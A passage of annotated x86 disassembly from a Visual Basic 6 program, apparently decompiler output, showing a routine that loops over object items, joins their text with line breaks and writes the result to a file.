008D8287: lea ecx, var_3C
008D828A: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D828F: lea ecx, var_40
008D8292: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
008D8297: lea ecx, var_54
008D829A: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008D829F: mov var_04, 0000000Eh
008D82A6: push var_3C
008D82A9: push 00000000h
008D82AB: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
008D82B0: test eax, eax
008D82B2: jz 008D86AEh
008D82B8: mov var_04, 0000000Fh
008D82BF: mov var_000000D0, 00000001h
008D82C9: mov var_000000D8, 00000002h
008D82D3: push 00000000h
008D82D5: push 00000001h
008D82D7: push 00440E48h
008D82DC: push 00000000h
008D82DE: push 00000018h
008D82E0: mov eax, [ebp+08h]
008D82E3: mov eax, [eax]
008D82E5: push [ebp+08h]
008D82E8: call [eax+00000308h]
008D82EE: push eax
008D82EF: lea eax, var_54
008D82F2: push eax
008D82F3: call 00410A84h ; Set (object)
008D82F8: push eax
008D82F9: lea eax, var_78
008D82FC: push eax
008D82FD: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D8302: add esp, 00000010h
008D8305: push eax
008D8306: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D830B: push eax
008D830C: lea eax, var_58
008D830F: push eax
008D8310: call 00410A84h ; Set (object)
008D8315: push eax
008D8316: lea eax, var_00000088
008D831C: push eax
008D831D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D8322: add esp, 00000010h
008D8325: push eax
008D8326: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008D832B: mov var_000000E0, eax
008D8331: mov var_000000E8, 00000003h
008D833B: mov var_000000F0, 00000001h
008D8345: mov var_000000F8, 00000002h
008D834F: lea eax, var_000000D8
008D8355: push eax
008D8356: lea eax, var_000000E8
008D835C: push eax
008D835D: lea eax, var_000000F8
008D8363: push eax
008D8364: lea eax, var_00000158
008D836A: push eax
008D836B: lea eax, var_00000148
008D8371: push eax
008D8372: lea eax, var_30
008D8375: push eax
008D8376: call 00410A3Ch ; For
008D837B: mov var_00000178, eax
008D8381: lea eax, var_58
008D8384: push eax
008D8385: lea eax, var_54
008D8388: push eax
008D8389: push 00000002h
008D838B: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D8390: add esp, 0000000Ch
008D8393: lea eax, var_00000088
008D8399: push eax
008D839A: lea eax, var_78
008D839D: push eax
008D839E: push 00000002h
008D83A0: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D83A5: add esp, 0000000Ch
008D83A8: jmp 008D8626h
008D83AD: mov var_04, 00000010h
008D83B4: lea eax, var_30
008D83B7: mov var_000000D0, eax
008D83BD: mov var_000000D8, 0000400Ch
008D83C7: mov var_000000F0, 00000001h
008D83D1: mov var_000000F8, 00000003h
008D83DB: lea eax, var_30
008D83DE: mov var_000000E0, eax
008D83E4: mov var_000000E8, 0000400Ch
008D83EE: push var_38
008D83F1: push 00000000h
008D83F3: push 00000000h
008D83F5: push 00440E58h
008D83FA: push 00000010h
008D83FC: pop eax
008D83FD: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D8402: lea esi, var_000000D8
008D8408: mov edi, esp
008D840A: movsd 
008D840B: movsd 
008D840C: movsd 
008D840D: movsd 
008D840E: push 00000001h
008D8410: push 00000000h
008D8412: push 00440E48h
008D8417: push 00000000h
008D8419: push 00000018h
008D841B: mov eax, [ebp+08h]
008D841E: mov eax, [eax]
008D8420: push [ebp+08h]
008D8423: call [eax+00000308h]
008D8429: push eax
008D842A: lea eax, var_54
008D842D: push eax
008D842E: call 00410A84h ; Set (object)
008D8433: push eax
008D8434: lea eax, var_78
008D8437: push eax
008D8438: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D843D: add esp, 00000010h
008D8440: push eax
008D8441: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D8446: push eax
008D8447: lea eax, var_58
008D844A: push eax
008D844B: call 00410A84h ; Set (object)
008D8450: push eax
008D8451: lea eax, var_00000088
008D8457: push eax
008D8458: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D845D: add esp, 00000020h
008D8460: push eax
008D8461: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D8466: push eax
008D8467: lea eax, var_5C
008D846A: push eax
008D846B: call 00410A84h ; Set (object)
008D8470: push eax
008D8471: lea eax, var_00000098
008D8477: push eax
008D8478: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D847D: add esp, 00000010h
008D8480: push eax
008D8481: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008D8486: mov edx, eax
008D8488: lea ecx, var_40
008D848B: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D8490: push eax
008D8491: call 00410A18h ; &
008D8496: mov edx, eax
008D8498: lea ecx, var_44
008D849B: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D84A0: push eax
008D84A1: push 004412B8h
008D84A6: call 00410A18h ; &
008D84AB: mov edx, eax
008D84AD: lea ecx, var_48
008D84B0: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D84B5: push eax
008D84B6: push 00000010h
008D84B8: pop eax
008D84B9: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D84BE: lea esi, var_000000F8
008D84C4: mov edi, esp
008D84C6: movsd 
008D84C7: movsd 
008D84C8: movsd 
008D84C9: movsd 
008D84CA: push 00000001h
008D84CC: push 00000010h
008D84CE: push 00440E58h
008D84D3: push 00000010h
008D84D5: pop eax
008D84D6: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D84DB: lea esi, var_000000E8
008D84E1: mov edi, esp
008D84E3: movsd 
008D84E4: movsd 
008D84E5: movsd 
008D84E6: movsd 
008D84E7: push 00000001h
008D84E9: push 00000000h
008D84EB: push 00440E48h
008D84F0: push 00000000h
008D84F2: push 00000018h
008D84F4: mov eax, [ebp+08h]
008D84F7: mov eax, [eax]
008D84F9: push [ebp+08h]
008D84FC: call [eax+00000308h]
008D8502: push eax
008D8503: lea eax, var_60
008D8506: push eax
008D8507: call 00410A84h ; Set (object)
008D850C: push eax
008D850D: lea eax, var_000000A8
008D8513: push eax
008D8514: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D8519: add esp, 00000010h
008D851C: push eax
008D851D: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D8522: push eax
008D8523: lea eax, var_64
008D8526: push eax
008D8527: call 00410A84h ; Set (object)
008D852C: push eax
008D852D: lea eax, var_000000B8
008D8533: push eax
008D8534: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D8539: add esp, 00000020h
008D853C: push eax
008D853D: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D8542: push eax
008D8543: lea eax, var_68
008D8546: push eax
008D8547: call 00410A84h ; Set (object)
008D854C: push eax
008D854D: lea eax, var_000000C8
008D8553: push eax
008D8554: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D8559: add esp, 00000020h
008D855C: push eax
008D855D: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008D8562: mov edx, eax
008D8564: lea ecx, var_4C
008D8567: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D856C: push eax
008D856D: call 00410A18h ; &
008D8572: mov edx, eax
008D8574: lea ecx, var_50
008D8577: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D857C: push eax
008D857D: push 00441264h ; vbCrLf
008D8582: call 00410A18h ; &
008D8587: mov edx, eax
008D8589: lea ecx, var_38
008D858C: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D8591: lea eax, var_50
008D8594: push eax
008D8595: lea eax, var_4C
008D8598: push eax
008D8599: lea eax, var_48
008D859C: push eax
008D859D: lea eax, var_44
008D85A0: push eax
008D85A1: lea eax, var_40
008D85A4: push eax
008D85A5: push 00000005h
008D85A7: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008D85AC: add esp, 00000018h
008D85AF: lea eax, var_68
008D85B2: push eax
008D85B3: lea eax, var_64
008D85B6: push eax
008D85B7: lea eax, var_60
008D85BA: push eax
008D85BB: lea eax, var_5C
008D85BE: push eax
008D85BF: lea eax, var_58
008D85C2: push eax
008D85C3: lea eax, var_54
008D85C6: push eax
008D85C7: push 00000006h
008D85C9: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D85CE: add esp, 0000001Ch
008D85D1: lea eax, var_000000C8
008D85D7: push eax
008D85D8: lea eax, var_000000B8
008D85DE: push eax
008D85DF: lea eax, var_000000A8
008D85E5: push eax
008D85E6: lea eax, var_00000098
008D85EC: push eax
008D85ED: lea eax, var_00000088
008D85F3: push eax
008D85F4: lea eax, var_78
008D85F7: push eax
008D85F8: push 00000006h
008D85FA: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D85FF: add esp, 0000001Ch
008D8602: mov var_04, 00000011h
008D8609: lea eax, var_00000158
008D860F: push eax
008D8610: lea eax, var_00000148
008D8616: push eax
008D8617: lea eax, var_30
008D861A: push eax
008D861B: call 00410A36h ; Next
008D8620: mov var_00000178, eax
008D8626: cmp var_00000178, 00000000h
008D862D: jnz 008D83ADh
008D8633: mov var_04, 00000012h
008D863A: mov var_70, 80020004h
008D8641: mov var_78, 0000000Ah
008D8648: lea eax, var_78
008D864B: push eax
008D864C: call 004108C2h ; FreeFile
008D8651: movsx eax, ax
008D8654: mov var_34, eax
008D8657: lea ecx, var_78
008D865A: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008D865F: mov var_04, 00000013h
008D8666: push var_3C
008D8669: mov ecx, var_34
008D866C: call 004108B0h ; msvbvm60.dll.__vbaI2I4
008D8671: push eax
008D8672: push FFFFFFFFh
008D8674: push 00000220h
008D8679: call 004108B6h ; Open #
008D867E: mov var_04, 00000014h
008D8685: mov ecx, var_34
008D8688: call 004108B0h ; msvbvm60.dll.__vbaI2I4
008D868D: push eax
008D868E: lea eax, var_38
008D8691: push eax
008D8692: push 00000000h
008D8694: call 0041089Eh ; Put #
008D8699: mov var_04, 00000015h
008D86A0: mov ecx, var_34
008D86A3: call 004108B0h ; msvbvm60.dll.__vbaI2I4
008D86A8: push eax
008D86A9: call 00410898h ; Close #arg_1
008D86AE: mov var_10, 00000000h
008D86B5: push 008D876Dh
008D86BA: jmp 8D872Eh
008D86BC: lea eax, var_50
008D86BF: push eax
008D86C0: lea eax, var_4C
008D86C3: push eax
008D86C4: lea eax, var_48
008D86C7: push eax
008D86C8: lea eax, var_44
008D86CB: push eax
008D86CC: lea eax, var_40
008D86CF: push eax
008D86D0: push 00000005h
008D86D2: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008D86D7: add esp, 00000018h
008D86DA: lea eax, var_68
008D86DD: push eax
008D86DE: lea eax, var_64
008D86E1: push eax
008D86E2: lea eax, var_60
008D86E5: push eax
008D86E6: lea eax, var_5C
008D86E9: push eax
008D86EA: lea eax, var_58
008D86ED: push eax
008D86EE: lea eax, var_54
008D86F1: push eax
008D86F2: push 00000006h
008D86F4: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D86F9: add esp, 0000001Ch
008D86FC: lea eax, var_000000C8
008D8702: push eax
008D8703: lea eax, var_000000B8
008D8709: push eax
008D870A: lea eax, var_000000A8
008D8710: push eax
008D8711: lea eax, var_00000098
008D8717: push eax
008D8718: lea eax, var_00000088
008D871E: push eax
008D871F: lea eax, var_78
008D8722: push eax
008D8723: push 00000006h
008D8725: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D872A: add esp, 0000001Ch
008D872D: ret 
End Sub

